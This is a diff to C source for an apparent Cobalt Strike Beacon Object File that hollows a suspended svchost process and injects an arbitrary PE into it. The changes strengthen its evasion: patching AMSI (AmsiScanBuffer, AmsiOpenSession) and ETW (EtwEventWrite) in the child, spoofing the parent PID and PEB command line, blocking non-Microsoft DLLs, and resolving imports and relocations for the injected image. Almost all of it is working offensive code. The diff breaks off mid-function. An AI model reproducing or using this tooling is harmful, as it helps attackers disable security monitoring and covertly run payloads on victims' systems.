@@ -19,20 +19,20 @@
 #define POLL_INTERVAL_MS   200
 #define OUTPUT_CHUNK_MAX   (1024 * 64)
 
-#define DEFAULT_SPAWNTO L"C:\\Windows\\System32\\svchost.exe"
+#define DEFAULT_SPAWNTO_W L"C:\\Windows\\System32\\svchost.exe"
 #define DEFAULT_SPAWNTO_A "C:\\Windows\\System32\\svchost.exe"
 
 /* ================================================================
- *  Utility
+ *  Minimal libc replacements (BOF has no CRT)
  * ================================================================ */
 
-void *_memset(void *dest, int c, size_t n) {
+static void *xmemset(void *dest, int c, size_t n) {
     unsigned char *d = (unsigned char *)dest;
     while (n--) *d++ = (unsigned char)c;
     return dest;
 }
 
-void *_memcpy(void *dest, const void *src, size_t n) {
+static void *xmemcpy(void *dest, const void *src, size_t n) {
     unsigned char *d = (unsigned char *)dest;
     const unsigned char *s = (const unsigned char *)src;
     while (n--) *d++ = *s++;
@@ -40,12 +40,12 @@ void *_memcpy(void *dest, const void *src, size_t n) {
 }
 
 /* ================================================================
- *  Find PID by name (for PPID spoofing)
+ *  Process enumeration for PPID spoofing
  * ================================================================ */
 
 static DWORD FindPidByName(const char *procName) {
     PROCESSENTRY32 pe;
-    _memset(&pe, 0, sizeof(pe));
+    xmemset(&pe, 0, sizeof(pe));
     pe.dwSize = sizeof(PROCESSENTRY32);
 
     HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -64,7 +64,6 @@ static DWORD FindPidByName(const char *procName) {
     return pid;
 }
 
-/* Pick a believable parent for the spawnto process */
 static DWORD FindSpoofParent(const char *spawntoA) {
     const char *name = spawntoA;
     const char *p = spawntoA;
@@ -87,10 +86,18 @@ static DWORD FindSpoofParent(const char *spawntoA) {
 
 /* ================================================================
  *  AMSI + ETW patching in remote process
+ *
+ *  Strategy: force-load amsi.dll into child via CreateRemoteThread
+ *  + LoadLibraryA, then patch AmsiScanBuffer and AmsiOpenSession.
+ *  ETW: patch EtwEventWrite in ntdll.
+ *
+ *  Both use the per-boot ASLR property: DLLs map at the same base
+ *  in every process for a given boot session, so local GetProcAddress
+ *  gives the correct remote address.
+ *
+ *  Verification: read back patched bytes to confirm write landed.
  * ================================================================ */
 
-/* Patch a function in the remote process. Uses local module address as proxy —
-   ntdll is always at the same base (ASLR shared), amsi.dll must be force-loaded first. */
 static BOOL PatchRemoteFunction(HANDLE hProcess, HMODULE hLocalMod,
                                 const char *funcName, BYTE *patch, DWORD patchLen) {
     FARPROC pFunc = KERNEL32$GetProcAddress(hLocalMod, funcName);
@@ -99,9 +106,8 @@ static BOOL PatchRemoteFunction(HANDLE hProcess, HMODULE hLocalMod,
     LPVOID pRemoteFunc = (LPVOID)pFunc;
 
     DWORD dwOldProtect = 0;
-    if (!KERNEL32$VirtualProtectEx(hProcess, pRemoteFunc, patchLen, PAGE_READWRITE, &dwOldProtect)) {
+    if (!KERNEL32$VirtualProtectEx(hProcess, pRemoteFunc, patchLen, PAGE_READWRITE, &dwOldProtect))
         return FALSE;
-    }
 
     SIZE_T written = 0;
     BOOL ok = KERNEL32$WriteProcessMemory(hProcess, pRemoteFunc, patch, patchLen, &written);
@@ -109,11 +115,21 @@ static BOOL PatchRemoteFunction(HANDLE hProcess, HMODULE hLocalMod,
     DWORD dwDummy = 0;
     KERNEL32$VirtualProtectEx(hProcess, pRemoteFunc, patchLen, dwOldProtect, &dwDummy);
 
-    return ok && (written == patchLen);
+    if (!ok || written != patchLen) return FALSE;
+
+    BYTE verify[16];
+    SIZE_T br = 0;
+    if (patchLen <= sizeof(verify)) {
+        if (KERNEL32$ReadProcessMemory(hProcess, pRemoteFunc, verify, patchLen, &br) && br == patchLen) {
+            for (DWORD i = 0; i < patchLen; i++) {
+                if (verify[i] != patch[i]) return FALSE;
+            }
+        }
+    }
+
+    return TRUE;
 }
 
-/* Force-load amsi.dll into child process via CreateRemoteThread(LoadLibraryA),
-   then patch AmsiScanBuffer + AmsiOpenSession */
 static void PatchAMSI(HANDLE hProcess) {
     HMODULE hKernel = KERNEL32$GetModuleHandleA("kernel32.dll");
     if (!hKernel) return;
@@ -131,34 +147,54 @@ static void PatchAMSI(HANDLE hProcess) {
 
     HANDLE hThread = KERNEL32$CreateRemoteThread(hProcess, NULL, 0,
         (LPTHREAD_START_ROUTINE)pLoadLib, pRemoteStr, 0, NULL);
-    if (hThread) {
-        KERNEL32$WaitForSingleObject(hThread, 5000);
-        KERNEL32$CloseHandle(hThread);
+    if (!hThread) {
+        KERNEL32$VirtualFreeEx(hProcess, pRemoteStr, 0, MEM_RELEASE);
+        return;
     }
 
+    KERNEL32$WaitForSingleObject(hThread, 5000);
+
+    DWORD exitCode = 0;
+    KERNEL32$GetExitCodeThread(hThread, &exitCode);
+    KERNEL32$CloseHandle(hThread);
     KERNEL32$VirtualFreeEx(hProcess, pRemoteStr, 0, MEM_RELEASE);
 
-    /* Now amsi.dll is loaded in both processes at the same ASLR base */
+    if (exitCode == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] amsi.dll load failed in child (may not exist)");
+        return;
+    }
+
     HMODULE hAmsi = KERNEL32$LoadLibraryA("amsi.dll");
     if (!hAmsi) return;
 
-    BYTE amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    /* xor eax, eax; ret — AmsiScanBuffer returns S_OK, result = AMSI_RESULT_CLEAN */
+    BYTE amsiPatch[] = { 0x31, 0xC0, 0xC3 };
     if (PatchRemoteFunction(hProcess, hAmsi, "AmsiScanBuffer", amsiPatch, sizeof(amsiPatch))) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI patched");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI: AmsiScanBuffer patched (verified)");
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] AMSI: AmsiScanBuffer patch FAILED");
     }
 
-    BYTE amsiOpenPatch[] = { 0xB8, 0x01, 0x00, 0x07, 0x80, 0xC3 };
-    PatchRemoteFunction(hProcess, hAmsi, "AmsiOpenSession", amsiOpenPatch, sizeof(amsiOpenPatch));
+    BYTE amsiOpenPatch[] = { 0x31, 0xC0, 0xC3 };
+    if (PatchRemoteFunction(hProcess, hAmsi, "AmsiOpenSession", amsiOpenPatch, sizeof(amsiOpenPatch))) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI: AmsiOpenSession patched (verified)");
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] AMSI: AmsiOpenSession patch failed");
+    }
+
+    KERNEL32$FreeLibrary(hAmsi);
 }
 
 static void PatchETW(HANDLE hProcess) {
-    /* ntdll is always loaded at same base in all processes (ASLR shared) */
     HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
     if (!hNtdll) return;
 
+    /* xor eax, eax; ret */
     BYTE etwPatch[] = { 0x33, 0xC0, 0xC3 };
     if (PatchRemoteFunction(hProcess, hNtdll, "EtwEventWrite", etwPatch, sizeof(etwPatch))) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] ETW patched");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] ETW: EtwEventWrite patched (verified)");
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] ETW: EtwEventWrite patch FAILED");
     }
 }
 
@@ -166,35 +202,37 @@ static void PatchETW(HANDLE hProcess) {
  *  Section protection mapping
  * ================================================================ */
 
+static DWORD SectionCharToProtect(DWORD c) {
+    BOOL x = (c & IMAGE_SCN_MEM_EXECUTE) != 0;
+    BOOL r = (c & IMAGE_SCN_MEM_READ)    != 0;
+    BOOL w = (c & IMAGE_SCN_MEM_WRITE)   != 0;
+
+    if (x && w && r) return PAGE_EXECUTE_READWRITE;
+    if (x && r)      return PAGE_EXECUTE_READ;
+    if (x && w)      return PAGE_EXECUTE_WRITECOPY;
+    if (x)           return PAGE_EXECUTE;
+    if (w && r)      return PAGE_READWRITE;
+    if (w)           return PAGE_WRITECOPY;
+    if (r)           return PAGE_READONLY;
+    return PAGE_NOACCESS;
+}
+
 static BOOL AdjustSectionProtections(HANDLE hProcess, ULONG_PTR baseAddr,
                                      PIMAGE_NT_HEADERS pNt, PIMAGE_SECTION_HEADER pSec) {
+    BOOL allOk = TRUE;
     for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
         if (!pSec[i].SizeOfRawData || !pSec[i].VirtualAddress) continue;
 
-        DWORD prot = PAGE_READONLY;
-        DWORD c = pSec[i].Characteristics;
-        BOOL x = c & IMAGE_SCN_MEM_EXECUTE;
-        BOOL r = c & IMAGE_SCN_MEM_READ;
-        BOOL w = c & IMAGE_SCN_MEM_WRITE;
-
-        if (x && w && r)      prot = PAGE_EXECUTE_READWRITE;
-        else if (x && r)      prot = PAGE_EXECUTE_READ;
-        else if (x && w)      prot = PAGE_EXECUTE_WRITECOPY;
-        else if (x)           prot = PAGE_EXECUTE;
-        else if (w && r)      prot = PAGE_READWRITE;
-        else if (w)           prot = PAGE_WRITECOPY;
-        else if (r)           prot = PAGE_READONLY;
-
+        DWORD prot = SectionCharToProtect(pSec[i].Characteristics);
         DWORD oldProt = 0;
         if (!KERNEL32$VirtualProtectEx(hProcess,
                 (PVOID)(baseAddr + pSec[i].VirtualAddress),
                 pSec[i].SizeOfRawData, prot, &oldProt)) {
-            BeaconPrintf(CALLBACK_ERROR, "VirtualProtectEx section %d error: %lu",
-                         i, KERNEL32$GetLastError());
-            return FALSE;
+            BeaconPrintf(CALLBACK_ERROR, "VirtualProtectEx section %d: %lu", i, KERNEL32$GetLastError());
+            allOk = FALSE;
         }
     }
-    return TRUE;
+    return allOk;
 }
 
 /* ================================================================
@@ -207,7 +245,7 @@ static void DrainPipe(HANDLE hPipe) {
         if (!KERNEL32$PeekNamedPipe(hPipe, NULL, 0, NULL, &avail, NULL) || avail == 0) return;
 
         DWORD toRead = avail < OUTPUT_CHUNK_MAX ? avail : OUTPUT_CHUNK_MAX;
-        BYTE *buf = (BYTE*)KERNEL32$LocalAlloc(0x40 /*LPTR*/, toRead + 1);
+        BYTE *buf = (BYTE*)KERNEL32$LocalAlloc(0x40, toRead + 1);
         if (!buf) return;
 
         DWORD bytesRead = 0;
@@ -216,7 +254,6 @@ static void DrainPipe(HANDLE hPipe) {
             BeaconOutput(CALLBACK_OUTPUT, (char*)buf, bytesRead);
         }
         KERNEL32$LocalFree(buf);
-
         if (bytesRead < toRead) return;
     }
 }
@@ -280,15 +317,14 @@ static void SpawnCleanup(SPAWN_CTX *ctx, BOOL keepProc) {
 
 static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls,
                            BOOL noPpid, int realCmdMinBytes, SPAWN_CTX *ctx) {
-    _memset(ctx, 0, sizeof(SPAWN_CTX));
+    xmemset(ctx, 0, sizeof(SPAWN_CTX));
     ctx->si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
 
     SECURITY_ATTRIBUTES sa;
-    _memset(&sa, 0, sizeof(sa));
+    xmemset(&sa, 0, sizeof(sa));
     sa.nLength = sizeof(sa);
     sa.bInheritHandle = TRUE;
 
-    /* Pipes for output capture */
     if (wantOutput) {
         if (!KERNEL32$CreatePipe(&ctx->hPipeOutRead, &ctx->hPipeOutWrite, &sa, 0)) {
             BeaconPrintf(CALLBACK_ERROR, "CreatePipe out: %lu", KERNEL32$GetLastError());
@@ -299,7 +335,7 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
             SpawnCleanup(ctx, FALSE);
             return FALSE;
         }
-        KERNEL32$SetHandleInformation(ctx->hPipeOutRead, 1/*HANDLE_FLAG_INHERIT*/, 0);
+        KERNEL32$SetHandleInformation(ctx->hPipeOutRead, 1, 0);
         KERNEL32$SetHandleInformation(ctx->hPipeInWrite, 1, 0);
 
         ctx->si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
@@ -312,21 +348,17 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
         ctx->si.StartupInfo.wShowWindow = SW_HIDE;
     }
 
-    /* Must live until CreateProcessA — UpdateProcThreadAttribute stores pointer, not value */
     DWORD64 blockDllsPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
 
-    /* PPID spoofing */
     if (!noPpid) {
         DWORD parentPid = FindSpoofParent(spawntoA);
         if (parentPid) {
             ctx->hParent = KERNEL32$OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
-            if (ctx->hParent) {
-                BeaconPrintf(CALLBACK_OUTPUT, "[+] PPID spoof target: PID %lu", parentPid);
-            }
+            if (ctx->hParent)
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] PPID spoof: PID %lu", parentPid);
         }
     }
 
-    /* Attribute count: PPID (if available) + BlockDLLs (if requested) */
     DWORD attrCount = 0;
     if (ctx->hParent) attrCount++;
     if (blockDlls) attrCount++;
@@ -336,7 +368,7 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
         KERNEL32$InitializeProcThreadAttributeList(NULL, attrCount, 0, &attrSize);
         ctx->attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$LocalAlloc(0x40, attrSize);
         if (!ctx->attrList || !KERNEL32$InitializeProcThreadAttributeList(ctx->attrList, attrCount, 0, &attrSize)) {
-            BeaconPrintf(CALLBACK_ERROR, "InitializeProcThreadAttributeList: %lu", KERNEL32$GetLastError());
+            BeaconPrintf(CALLBACK_ERROR, "InitAttrList: %lu", KERNEL32$GetLastError());
             SpawnCleanup(ctx, FALSE);
             return FALSE;
         }
@@ -345,7 +377,7 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
             if (!KERNEL32$UpdateProcThreadAttribute(ctx->attrList, 0,
                     PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                     &ctx->hParent, sizeof(HANDLE), NULL, NULL)) {
-                BeaconPrintf(CALLBACK_OUTPUT, "[!] PPID spoof failed (%lu), continuing without", KERNEL32$GetLastError());
+                BeaconPrintf(CALLBACK_OUTPUT, "[!] PPID spoof failed (%lu), continuing", KERNEL32$GetLastError());
             } else {
                 BeaconPrintf(CALLBACK_OUTPUT, "[+] PPID spoofed");
             }
@@ -355,7 +387,7 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
             if (!KERNEL32$UpdateProcThreadAttribute(ctx->attrList, 0,
                     PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                     &blockDllsPolicy, sizeof(blockDllsPolicy), NULL, NULL)) {
-                BeaconPrintf(CALLBACK_OUTPUT, "[!] BlockDLLs failed (%lu), continuing without", KERNEL32$GetLastError());
+                BeaconPrintf(CALLBACK_OUTPUT, "[!] BlockDLLs failed (%lu)", KERNEL32$GetLastError());
             } else {
                 BeaconPrintf(CALLBACK_OUTPUT, "[+] BlockDLLs enabled");
             }
@@ -364,9 +396,8 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
         ctx->si.lpAttributeList = ctx->attrList;
     }
 
-    /* Build fake command line, padded so PEB buffer fits real args later */
     char fakeCmd[4096];
-    _memset(fakeCmd, 0, sizeof(fakeCmd));
+    xmemset(fakeCmd, 0, sizeof(fakeCmd));
     int fakeLen = MSVCRT$_snprintf(fakeCmd, sizeof(fakeCmd) - 1,
         "%s -k LocalServiceNetworkRestricted", spawntoA);
     if (fakeLen < 0) fakeLen = MSVCRT$strlen(fakeCmd);
@@ -393,7 +424,7 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
                     NULL, fakeCmd, NULL, NULL, wantOutput ? TRUE : FALSE,
                     flags, NULL, NULL, (LPSTARTUPINFOA)&ctx->si, &ctx->pi);
                 if (tokenCreate)
-                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Created process with impersonation token");
+                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process created with impersonation token");
                 else
                     BeaconPrintf(CALLBACK_OUTPUT, "[!] CreateProcessAsUserA: %lu, fallback",
                         KERNEL32$GetLastError());
@@ -414,7 +445,6 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawned %s (PID %lu) suspended", spawntoA, ctx->pi.dwProcessId);
 
-    /* Close inherited ends */
     if (ctx->hPipeOutWrite) { KERNEL32$CloseHandle(ctx->hPipeOutWrite); ctx->hPipeOutWrite = NULL; }
     if (ctx->hPipeInRead)   { KERNEL32$CloseHandle(ctx->hPipeInRead);   ctx->hPipeInRead = NULL; }
     if (ctx->attrList) {
@@ -428,32 +458,32 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
 }
 
 /* ================================================================
- *  Spoof command line in PEB after creation
+ *  PEB command-line spoofing
  * ================================================================ */
 
 static BOOL SpoofCommandLine(HANDLE hProcess, const char *realCmdA) {
     PROCESS_BASIC_INFORMATION pbi;
-    _memset(&pbi, 0, sizeof(pbi));
+    xmemset(&pbi, 0, sizeof(pbi));
 
-    NTSTATUS st = NTDLL$NtQueryInformationProcess(hProcess, 0/*ProcessBasicInformation*/,
+    NTSTATUS st = NTDLL$NtQueryInformationProcess(hProcess, 0,
                                                    &pbi, sizeof(pbi), NULL);
     if (st != 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] PEB read failed (0x%lx), args visible in fake form", st);
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] PEB query failed (0x%lx)", st);
         return FALSE;
     }
 
     PEB peb;
-    _memset(&peb, 0, sizeof(peb));
+    xmemset(&peb, 0, sizeof(peb));
     SIZE_T br = 0;
     if (!KERNEL32$ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &br))
         return FALSE;
 
     RTL_USER_PROCESS_PARAMETERS params;
-    _memset(&params, 0, sizeof(params));
+    xmemset(&params, 0, sizeof(params));
     if (!KERNEL32$ReadProcessMemory(hProcess, peb.ProcessParameters, &params, sizeof(params), &br))
         return FALSE;
 
-    int wideLen = KERNEL32$MultiByteToWideChar(0/*CP_ACP*/, 0, realCmdA, -1, NULL, 0);
+    int wideLen = KERNEL32$MultiByteToWideChar(0, 0, realCmdA, -1, NULL, 0);
     if (wideLen == 0) return FALSE;
 
     LPWSTR wideBuf = (LPWSTR)KERNEL32$LocalAlloc(0x40, wideLen * sizeof(WCHAR));
@@ -464,121 +494,264 @@ static BOOL SpoofCommandLine(HANDLE hProcess, const char *realCmdA) {
     USHORT realSizeBytes = (USHORT)(wideLen * sizeof(WCHAR));
     SIZE_T bw = 0;
 
-    KERNEL32$WriteProcessMemory(hProcess, params.CommandLine.Buffer, wideBuf, realSizeBytes, &bw);
+    BOOL ok1 = KERNEL32$WriteProcessMemory(hProcess, params.CommandLine.Buffer, wideBuf, realSizeBytes, &bw);
 
     USHORT newLen = (USHORT)((wideLen - 1) * sizeof(WCHAR));
-    KERNEL32$WriteProcessMemory(hProcess,
+    BOOL ok2 = KERNEL32$WriteProcessMemory(hProcess,
         (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
         &newLen, sizeof(USHORT), &bw);
 
     KERNEL32$LocalFree(wideBuf);
+
+    if (!ok1 || !ok2) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] CmdLine spoof partial failure (write1=%d write2=%d)", ok1, ok2);
+        return FALSE;
+    }
     return TRUE;
 }
 
 /* ================================================================
- *  PE Hollowing core
+ *  PE Validation
  * ================================================================ */
 
-static BOOL HollowWithPE(HANDLE hProcess, HANDLE hThread, BYTE *peData, DWORD peSize,
-                         const char *argsA, const char *spawntoA) {
+static BOOL ValidatePE(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS *ppNt) {
+    if (peSize < sizeof(IMAGE_DOS_HEADER)) {
+        BeaconPrintf(CALLBACK_ERROR, "PE too small for DOS header");
+        return FALSE;
+    }
+
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peData;
-    if (peSize < sizeof(IMAGE_DOS_HEADER) || pDos->e_magic != IMAGE_DOS_SIGNATURE) {
-        BeaconPrintf(CALLBACK_ERROR, "Invalid PE: bad DOS header");
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
+        BeaconPrintf(CALLBACK_ERROR, "Bad DOS signature");
+        return FALSE;
+    }
+
+    if (pDos->e_lfanew < 0 || (DWORD)pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > peSize) {
+        BeaconPrintf(CALLBACK_ERROR, "e_lfanew out of bounds");
         return FALSE;
     }
 
     PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peData + pDos->e_lfanew);
-    if ((BYTE*)pNt + sizeof(IMAGE_NT_HEADERS) > peData + peSize) {
-        BeaconPrintf(CALLBACK_ERROR, "Invalid PE: NT headers out of bounds");
-        return FALSE;
-    }
     if (pNt->Signature != IMAGE_NT_SIGNATURE) {
-        BeaconPrintf(CALLBACK_ERROR, "Invalid PE: bad NT signature");
+        BeaconPrintf(CALLBACK_ERROR, "Bad NT signature");
         return FALSE;
     }
+
     if (pNt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
-        BeaconPrintf(CALLBACK_ERROR, "PE is not x64");
+        BeaconPrintf(CALLBACK_ERROR, "PE is not x64 (machine=0x%x)", pNt->FileHeader.Machine);
         return FALSE;
     }
 
-    /* Allocate at preferred base, fall back to any address */
-    BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess,
-        (PVOID)pNt->OptionalHeader.ImageBase,
-        pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-    if (!pRemote) {
-        pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess, NULL,
-            pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    }
-    if (!pRemote) {
-        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
+    if (pNt->OptionalHeader.SizeOfImage == 0) {
+        BeaconPrintf(CALLBACK_ERROR, "SizeOfImage is zero");
         return FALSE;
     }
 
-    /* Relocate if needed */
-    if (pRemote != (BYTE*)pNt->OptionalHeader.ImageBase) {
-        ULONG_PTR delta = (ULONG_PTR)pRemote - pNt->OptionalHeader.ImageBase;
-        IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    if (pNt->OptionalHeader.AddressOfEntryPoint == 0) {
+        BeaconPrintf(CALLBACK_ERROR, "AddressOfEntryPoint is zero (.NET PE? Use execute-assembly)");
+        return FALSE;
+    }
 
-        if (relocDir.Size == 0) {
-            BeaconPrintf(CALLBACK_ERROR, "Relocation needed but PE has no .reloc section");
-            KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+    DWORD secEnd = pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS) +
+                   (pNt->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
+    if (secEnd > peSize) {
+        BeaconPrintf(CALLBACK_ERROR, "Section table extends past file");
+        return FALSE;
+    }
+
+    for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+        if (pSec[i].PointerToRawData + pSec[i].SizeOfRawData > peSize) {
+            BeaconPrintf(CALLBACK_ERROR, "Section %d raw data exceeds file", i);
+            return FALSE;
+        }
+    }
+
+    *ppNt = pNt;
+    return TRUE;
+}
+
+/* ================================================================
+ *  Import resolution (the critical missing piece)
+ *
+ *  Walk IAT, LoadLibraryA each DLL in the LOCAL process (which
+ *  maps it at the per-boot ASLR base shared by all processes),
+ *  resolve each function, write the address into the PE's IAT
+ *  in our LOCAL copy, which then gets written to the remote process.
+ *
+ *  This must happen BEFORE writing sections to the remote process.
+ * ================================================================ */
+
+static BOOL ResolveImports(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS pNt) {
+    IMAGE_DATA_DIRECTORY impDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (impDir.Size == 0 || impDir.VirtualAddress == 0)
+        return TRUE;
+
+    if (impDir.VirtualAddress + sizeof(IMAGE_IMPORT_DESCRIPTOR) > peSize) {
+        BeaconPrintf(CALLBACK_ERROR, "Import directory out of bounds");
+        return FALSE;
+    }
+
+    PIMAGE_IMPORT_DESCRIPTOR pImp = (PIMAGE_IMPORT_DESCRIPTOR)(peData + impDir.VirtualAddress);
+
+    for (; pImp->Name != 0; pImp++) {
+        if (pImp->Name >= peSize) {
+            BeaconPrintf(CALLBACK_ERROR, "Import DLL name offset out of bounds");
             return FALSE;
         }
 
-        BYTE *pBlock = peData + relocDir.VirtualAddress;
-        DWORD processed = 0;
-        while (processed < relocDir.Size) {
-            DWORD pageRva   = *(DWORD*)(pBlock);
-            DWORD blockSize = *(DWORD*)(pBlock + 4);
-            if (blockSize == 0) break;
+        char *dllName = (char*)(peData + pImp->Name);
+        HMODULE hMod = KERNEL32$LoadLibraryA(dllName);
+        if (!hMod) {
+            BeaconPrintf(CALLBACK_ERROR, "LoadLibraryA(%s) failed: %lu", dllName, KERNEL32$GetLastError());
+            return FALSE;
+        }
 
-            DWORD entryCount = (blockSize - 8) / 2;
-            WORD *entries = (WORD*)(pBlock + 8);
+        ULONG_PTR *pThunk;
+        ULONG_PTR *pOrigThunk;
 
-            for (DWORD j = 0; j < entryCount; j++) {
-                BYTE type = (BYTE)(entries[j] >> 12);
-                WORD offset = entries[j] & 0x0FFF;
-                if (type == IMAGE_REL_BASED_DIR64) {
-                    ULONG_PTR *pPatch = (ULONG_PTR*)(peData + pageRva + offset);
-                    *pPatch += delta;
-                } else if (type == IMAGE_REL_BASED_HIGHLOW) {
-                    DWORD *pPatch = (DWORD*)(peData + pageRva + offset);
-                    *pPatch += (DWORD)delta;
+        if (pImp->FirstThunk >= peSize) {
+            BeaconPrintf(CALLBACK_ERROR, "FirstThunk out of bounds for %s", dllName);
+            return FALSE;
+        }
+
+        pThunk = (ULONG_PTR*)(peData + pImp->FirstThunk);
+
+        if (pImp->OriginalFirstThunk && pImp->OriginalFirstThunk < peSize)
+            pOrigThunk = (ULONG_PTR*)(peData + pImp->OriginalFirstThunk);
+        else
+            pOrigThunk = pThunk;
+
+        for (int i = 0; pOrigThunk[i] != 0; i++) {
+            FARPROC pFunc;
+
+            if (pOrigThunk[i] & IMAGE_ORDINAL_FLAG64) {
+                WORD ordinal = (WORD)(pOrigThunk[i] & 0xFFFF);
+                pFunc = KERNEL32$GetProcAddress(hMod, (LPCSTR)(ULONG_PTR)ordinal);
+                if (!pFunc) {
+                    BeaconPrintf(CALLBACK_ERROR, "%s ordinal %d not found", dllName, ordinal);
+                    return FALSE;
+                }
+            } else {
+                if (pOrigThunk[i] >= peSize) {
+                    BeaconPrintf(CALLBACK_ERROR, "Import hint/name out of bounds");
+                    return FALSE;
+                }
+                PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(peData + pOrigThunk[i]);
+                pFunc = KERNEL32$GetProcAddress(hMod, pName->Name);
+                if (!pFunc) {
+                    BeaconPrintf(CALLBACK_ERROR, "%s!%s not found", dllName, pName->Name);
+                    return FALSE;
                 }
             }
-            pBlock += blockSize;
-            processed += blockSize;
+
+            pThunk[i] = (ULONG_PTR)pFunc;
         }
-        pNt->OptionalHeader.ImageBase = (ULONG_PTR)pRemote;
     }
 
-    /* Write headers */
-    SIZE_T bw = 0;
-    if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, peData,
-            pNt->OptionalHeader.SizeOfHeaders, &bw)) {
-        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory headers: %lu", KERNEL32$GetLastError());
+    return TRUE;
+}
+
+/* ================================================================
+ *  Relocation processing
+ * ================================================================ */
+
+static BOOL ApplyRelocations(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS pNt, ULONG_PTR delta) {
+    if (delta == 0) return TRUE;
+
+    IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    if (relocDir.Size == 0) {
+        if (pNt->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) {
+            BeaconPrintf(CALLBACK_ERROR, "Relocation needed but PE has no .reloc and relocs stripped");
+            return FALSE;
+        }
+        return TRUE;
+    }
+
+    if (relocDir.VirtualAddress >= peSize) {
+        BeaconPrintf(CALLBACK_ERROR, "Relocation directory out of bounds");
         return FALSE;
     }
 
-    /* Write sections */
-    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
-    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
-        if (pSec[i].SizeOfRawData == 0) continue;
-        if (!KERNEL32$WriteProcessMemory(hProcess, pRemote + pSec[i].VirtualAddress,
-                peData + pSec[i].PointerToRawData, pSec[i].SizeOfRawData, &bw)) {
-            BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory section %d: %lu",
-                         i, KERNEL32$GetLastError());
-            return FALSE;
+    BYTE *pBlock = peData + relocDir.VirtualAddress;
+    DWORD processed = 0;
+
+    while (processed < relocDir.Size) {
+        DWORD pageRva   = *(DWORD*)(pBlock);
+        DWORD blockSize = *(DWORD*)(pBlock + 4);
+        if (blockSize == 0 || blockSize < 8) break;
+
